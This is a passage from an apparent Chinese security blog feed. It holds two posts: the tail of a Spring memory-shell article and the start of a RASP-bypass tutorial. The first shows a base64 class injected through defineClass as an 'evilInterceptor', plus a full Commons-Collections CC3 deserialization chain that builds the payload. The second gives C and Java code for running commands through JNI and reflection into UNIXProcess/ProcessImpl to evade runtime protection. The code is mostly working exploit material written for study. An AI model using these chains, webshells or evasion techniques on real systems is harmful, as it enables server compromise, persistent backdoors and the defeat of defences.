U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEABWZsdXNoAQAFY2xvc2UAIQAnACgAAQApAAAABAABACoAKwABACwAAAAvAAEAAQAAAAUqtwABsQAAAAIALQAAAAYAAQAAAAwALgAAAAwAAQAAAAUALwAwAAAAAQAxADIAAwAsAAACJwAGAAsAAADcKxICuQADAgA6BBkExgDOLLkABAEAOgUSBbgABrYABxIItgAJmQAiuwAKWQa9AAtZAxIMU1kEEg1TWQUZBFO3AA46BqcAH7sAClkGvQALWQMSD1NZBBIQU1kFGQRTtwAOOgYZBgS2ABFXGQa2ABI6B7sAE1m7ABRZGQe2ABW3ABa3ABc6CBIYOgm7ABlZtwAaOgoZCLYAG1k6CcYAIBkKuwAZWbcAGhkJtgAcEh22ABy2AB62ABxXp//bsgAfGQq2ACAZBRkKtgAhGQW2ACIZBbYAI6cABToFA6wErAABAA8A0wDWACQAAwAtAAAAVgAVAAAADwAKABAADwASABcAFAAnABUARgAXAGIAGQBpABoAcAAbAIUAHACJAB0AkgAeAJ0AHwC6ACEAwgAiAMkAIwDOACQA0wAmANYAJQDYACcA2gApAC4AAAB6AAwAQwADADMANAAGABcAvAA1ADYABQBiAHEAMwA0AAYAcABjADcAOAAHAIUATgA5ADoACACJAEoAOwA8AAkAkgBBAD0APgAKAAAA3AAvADAAAAAAANwAPwBAAAEAAADcAEEAQgACAAAA3ABDAEQAAwAKANIARQA8AAQARgAAAFUAB/0ARgcARwcASPwAGwcASf8ALwALBwBKBwBLBwBMBwBNBwBHBwBIBwBJBwBOBwBPBwBHBwBQAAAn/wAbAAUHAEoHAEsHAEwHAE0HAEcAAQcAUQEBAFIAAAAEAAEAJABTAAAADQMAPwAAAEEAAABDAAAAAQBUAFUAAwAsAAAAYAAFAAUAAAAKKissLRkEtwAlsQAAAAIALQAAAAoAAgAAAC4ACQAvAC4AAAA0AAUAAAAKAC8AMAAAAAAACgA/AEAAAQAAAAoAQQBCAAIAAAAKAEMARAADAAAACgBWAFcABABSAAAABAABACQAUwAAABEEAD8AAABBAAAAQwAAAFYAAAABAFgAWQADACwAAABgAAUABQAAAAoqKywtGQS3ACaxAAAAAgAtAAAACgACAAAAMwAJADQALgAAADQABQAAAAoALwAwAAAAAAAKAD8AQAABAAAACgBBAEIAAgAAAAoAQwBEAAMAAAAKAFoAWwAEAFIAAAAEAAEAJABTAAAAEQQAPwAAAEEAAABDAAAAWgAAAAEAXAAAAAIAXQ==&quot;</span>;<br>            <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br>            Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.interceptor.TestInterceptor&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>            Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>            <span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> (HandlerInterceptor) constructor.newInstance();<br>            adaptInterceptors.add(evilInterceptor);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>cc3链子</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Interceptor</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//利用反射设置需要满足的值</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;InterceptorDes.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//这里的赋值在序列化的时候就不需要了</span><br><span class="hljs-comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br><span class="hljs-comment">//        Transformer transformer = templates.newTransformer();</span><br>        <span class="hljs-comment">//结合前面的链子串联起来，随便一个都行</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotation</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(Class.class, Map.class);<br>        annotation.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotation.newInstance(Override.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotation.newInstance(Override.class, proxyMap);<br>        System.out.println(serialize(o));<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>)).writeObject(obj);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(bytes);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241114162939356.png" alt="image-20241114162939356"></p><p><img src="https://cdn.clown2024.cn/image-20241114163005607.png" alt="image-20241114163005607"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/12047?time__1311=GqGxR70QD=G=itD/YriQGkbvkp6QHKF4D&u_atoken=3b72cba8102056dc353d4296b75d2ed3&u_asig=0a47319217313359997215116e009a">https://xz.aliyun.com/t/12047?time__1311=GqGxR70QD%3DG%3DitD%2FYriQGkbvkp6QHKF4D&amp;u_atoken=3b72cba8102056dc353d4296b75d2ed3&amp;u_asig=0a47319217313359997215116e009a</a></p><p><a href="https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/code/TouchFilea.java">https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/code/TouchFilea.java</a></p><p><a href="https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/index.md">https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Spring/%E5%88%A9%E7%94%A8intercetor%E6%B3%A8%E5%85%A5Spring%E5%86%85%E5%AD%98%E9%A9%AC/index.md</a></p><p><a href="https://forum.butian.net/share/3002">https://forum.butian.net/share/3002</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Spring框架比较常用就不说了，网上大部分都是建一个spring+springmvc的项目来测试内存马，内存马主要的逻辑部分都集中在spr</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>RASP绕过学习</title>
    <link href="https://clowsman.github.io/2024/11/07/RASP%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/11/07/RASP%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-11-06T16:14:57.000Z</published>
    <updated>2024-11-11T14:43:13.083Z</updated>
    
    <content type="html"><![CDATA[<h1 id="rasp介绍"><a href="#RASP介绍" class="headerlink" title="RASP介绍"></a>RASP介绍</h1><p>RASP全称是Runtime applicaion self-protection，在2014念提出的一种应用程序自我保护技术，将防护功能注入到应用程序之中，通过少量的Hook函数监测程序的运行，根据当前的上下文环境实时阻断攻击事件。</p><p>目前Java RASP主要是通过Instrumentation编写Agent的形式，在Agent的premain和agentmain中加入检测类一般继承于ClassFileTransformer，当程序运行进来的时候，通过类中的transform检测字节码文件中是否有一些敏感的类文件，比如ProcessImpl等。简单的可以理解为通过Instrumentation来对JVM进行实时监控。</p><p>Instrumentation API 提供了两个核心接口：ClassFileTransformer 和 Instrumentation。ClassFileTransformer 接口允许开发者在类加载前或类重新定义时对字节码进行转换。Instrumentation 接口则提供了启动时代理和重新定义类的能力</p><p>Java Agent存在premain和agentmain两个方法，关于这两个方法在之前的java agent也说过了，这里就不再说了</p><p>所以其实就是和前面的文章一样编写一个ClassFileTransformer的实现类，使用该类来对程序进行实时监控，如果检测到相关的危险函数，就通过transform方法来对类字节码进行转化。</p><p>与传统 WAF 对比， RASP 实现更为底层，规则制定更为简单，攻击行为识别更为精准。</p><h1 id="rasp绕过原理"><a href="#RASP绕过原理" class="headerlink" title="RASP绕过原理"></a>RASP绕过原理</h1><p>我们可以知道，RASP主要是通过转换字节码来达到目的，如果设置的检测的方法存在着更底层的方法或者相同层级的不同方法能够达到相同的效果，那么就能完成绕过。</p><p>所以绕过的手法大致为两种：</p><ol><li>寻找没有被限制的类或者函数来绕过，也就是绕过黑名单</li><li>利用更底层的技术进行绕过，例如从 C 代码的层面进行绕过</li></ol><h1 id="jni绕过"><a href="#JNI绕过" class="headerlink" title="JNI绕过"></a>JNI绕过</h1><p>JNI（Java Native Interface）是 Java 提供的一种机制，用于在 Java 程序中调用本地（Native）代码，即使用其他语言（如C、C++）编写的代码，从而可以充分利用本地代码的功能和性能优势，实现对底层系统资源和外部库的访问。</p><p>JNI的设计是为了解决java无法直接访问底层系统资源或者利用本地库的问题，也可以用来绕过RASP。我们编写的代码最后是要编译为dll动态链接库或者so动态共享库，然后JNI通过加载这些共享库来执行我们编写的本地代码</p><p>我们写一个JNI使用dll的例子，写一个执行命令的方法</p><p>java文件</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Command</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">exec</span><span class="hljs-params">(String cmd)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>将其编译成.class文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">javac Command.java<br></code></pre></td></tr></table></figure><p>然后再用下面的命令生成c语言的.h头文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">javah -jni Command<br></code></pre></td></tr></table></figure><p>然后再去编写Command.c文件</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Command.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;jni.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">execmd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd, <span class="hljs-type">char</span> *result)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>*<span class="hljs-number">12</span>];   <br>    FILE *pipe = popen(cmd, <span class="hljs-string">&quot;r&quot;</span>); <br>    <span class="hljs-keyword">if</span> (!pipe)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (!feof(pipe))<br>    &#123;<br>        <span class="hljs-keyword">if</span> (fgets(buffer, <span class="hljs-keyword">sizeof</span>(buffer), pipe))<br>        &#123; <br>            <span class="hljs-built_in">strcat</span>(result, buffer);<br>        &#125;<br>    &#125;<br>    pclose(pipe); <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;     <br>&#125;<br>JNIEXPORT jstring JNICALL <span class="hljs-title function_">Java_Command_exec</span><span class="hljs-params">(JNIEnv *env, jobject class_object, jstring jstr)</span><br>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-type">char</span> result[<span class="hljs-number">1024</span> * <span class="hljs-number">12</span>] = <span class="hljs-string">&quot;&quot;</span>; <br>    execmd(cstr, result);<br>    <span class="hljs-type">char</span> return_messge[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-built_in">strcat</span>(return_messge, result);<br>    jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge);<br>    <span class="hljs-keyword">return</span> cmdresult;<br>&#125;<br></code></pre></td></tr></table></figure><p>写好之后进行编译，编译成dll文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gcc -I <span class="hljs-string">&quot;D:\CTF\Java\JDK\jdk1.8.0_65\include&quot;</span> -I <span class="hljs-string">&quot;D:\CTF\Java\JDK\jdk1.8.0_65\include\win32&quot;</span> -D__int64=<span class="hljs-string">&quot;long long&quot;</span> --shared <span class="hljs-string">&quot;D:\CTF\Java\JavaCode\JNITest\src\main\java\Command.c&quot;</span>  -o ./jni.dll<br></code></pre></td></tr></table></figure><blockquote><p>-D 是 <code>gcc</code> 编译器的一个预处理器参数，用于定义宏</p><p>-I用于指定额外的目录，让编译器在这些目录中搜索头文件</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20241107203652320.png" alt="image-20241107203652320"></p><p>然后用System.load或者System.loads方法就可以加载这个dll，然后就可以实例化Command类调用他的native方法了</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;java.library.path&quot;</span>));<br><span class="hljs-comment">//        System.loadLibrary(&quot;jni&quot;); //load()指定绝对路径</span><br>        System.load(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JNITest\\src\\main\\java\\jni.dll&quot;</span>);<br>        <span class="hljs-type">Command</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Command</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ipconfig</span> <span class="hljs-operator">=</span> command.exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        System.out.println(ipconfig);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这个java.library.path是java搜索共享库的路径，如果用loadLibrary方法的话，他是不能带路径的，只能从java.library.path中搜索并加载，所以要用loadLibrary方法加载dll的话需要确保dll在搜寻路径下面</p></blockquote><p>执行就可以弹计算器了</p><p><img src="https://cdn.clown2024.cn/image-20241107204035199.png" alt="image-20241107204035199"></p><p>所以其实绕过就是能把我们写的so上传的服务当中去，可以通过java的webshell、文件上传、或者反序列化等方式，加载我们写好的so或者dll</p><p>这里有一些JNI命令执行的脚本例子：<a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md</a></p><h1 id="unixprocess绕过"><a href="#UNIXProcess绕过" class="headerlink" title="UNIXProcess绕过"></a>UNIXProcess绕过</h1><p>说实话一开始看到这个东西我是很懵的，根本没听过，看了一下才知道这个是Runtime.exec()调用链的末端，平时只会用并没有关注过相关的调用链</p><p>RASP有些针对命令执行的过滤就是对调用链中的<strong>java.lang.ProcessImpl.start</strong>方法进行过滤。</p><p><strong>那来分析一下命令执行的调用链</strong></p><p>参考文章：<a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md</a></p><p><code>Runtime.exec(xxx)</code>调用链如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:247)<br>java.lang.ProcessImpl.start(ProcessImpl.java:134)<br>java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)<br>java.lang.Runtime.exec(Runtime.java:620)<br>java.lang.Runtime.exec(Runtime.java:450)<br>java.lang.Runtime.exec(Runtime.java:347)<br></code></pre></td></tr></table></figure><p>所以平时用的ProcessBuilder.start的执行命令的方法也处于这个调用链上</p><p>ProcessBuilder执行命令</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;calc&quot;</span>).start();<br></code></pre></td></tr></table></figure><p>上面的调用栈是Linux的，从字面也可以看得到这是UNIXProcess，Windows的话我自己跟进发现他和Linux不同的就是最终那一步，UNIXProcess变成ProcessImpl.create</p><p><img src="https://cdn.clown2024.cn/image-20241108135939928.png" alt="image-20241108135939928"></p><p>在该native方法实现里面就会调用Windows的api来创建一个新的进程</p><p>这里还是继续跟着文章的Linux版本来分析，所以我们需要关注的就是<code>UNIXProcess</code>和<code>ProcessImpl</code>，在JDK9之后把<code>UNIXProcess</code>合并到了<code>ProcessImpl</code>当中</p><p>他们最终调用的native方法是forkAndExec方法，如方法名所述主要是通过<code>fork&amp;exec</code>来执行本地系统命令</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">forkAndExec</span><span class="hljs-params">(<span class="hljs-type">int</span> mode, <span class="hljs-type">byte</span>[] helperpath,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] prog,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] argBlock, <span class="hljs-type">int</span> argc,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] envBlock, <span class="hljs-type">int</span> envc,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] dir,</span><br><span class="hljs-params">                                   <span class="hljs-type">int</span>[] fds,</span><br><span class="hljs-params">                                   <span class="hljs-type">boolean</span> redirectErrorStream)</span><br>        <span class="hljs-keyword">throws</span> IOException;<br></code></pre></td></tr></table></figure><p>所以我们利用这个绕过RASP防御的原理就是他们防御的层数不够深，比如只到<code>ProcessBuilder.start()</code>方法，而我们只需要直接调用最终执行的<code>UNIXProcess/ProcessImpl</code>实现命令执行或者直接反射<code>UNIXProcess/ProcessImpl</code>的<code>forkAndExec</code>方法就可以绕过RASP实现命令执行了。</p><p>这是ProcessImpl实例化UNIXProcess的源码，主要是看看参数传递</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessImpl</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> sun.misc.<span class="hljs-type">JavaIOFileDescriptorAccess</span> <span class="hljs-variable">fdAccess</span><br>        <span class="hljs-operator">=</span> sun.misc.SharedSecrets.getJavaIOFileDescriptorAccess();<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">ProcessImpl</span><span class="hljs-params">()</span> &#123;&#125;    <span class="hljs-comment">// Not instantiable</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] bytes = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>,<br>                         result, <span class="hljs-number">0</span>,<br>                         bytes.length);<br>        result[result.length-<span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>)<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    <span class="hljs-keyword">static</span> Process <span class="hljs-title function_">start</span><span class="hljs-params">(String[] cmdarray,</span><br><span class="hljs-params">                         java.util.Map&lt;String,String&gt; environment,</span><br><span class="hljs-params">                         String dir,</span><br><span class="hljs-params">                         ProcessBuilder.Redirect[] redirects,</span><br><span class="hljs-params">                         <span class="hljs-type">boolean</span> redirectErrorStream)</span><br>        <span class="hljs-keyword">throws</span> IOException<br>    &#123;<br>        <span class="hljs-keyword">assert</span> cmdarray != <span class="hljs-literal">null</span> &amp;&amp; cmdarray.length &gt; <span class="hljs-number">0</span>;<br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[cmdarray.length-<span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = cmdarray[i+<span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> 